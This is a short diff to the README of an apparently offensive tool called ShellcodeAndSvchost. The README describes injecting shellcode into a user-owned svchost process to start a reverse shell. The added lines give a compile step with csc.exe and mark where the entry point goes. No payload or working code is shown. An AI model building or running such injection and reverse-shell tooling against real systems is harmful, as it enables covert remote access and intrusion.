@@ -1,6 +1,7 @@
 # ShellcodeAndSvchost
 Inject your shellcode into svchost, serach for first svchost process owned by logged in user. Start reverse shell.
 
+Compile with csc.exe insert entrypoint exec
 
 ```
 using System;
@@ -187,7 +188,7 @@ string scode =
         return foundPID;
       }
 
-
+        // Insert entry point here
         public static unsafe void exec()
       	{
       			Program();
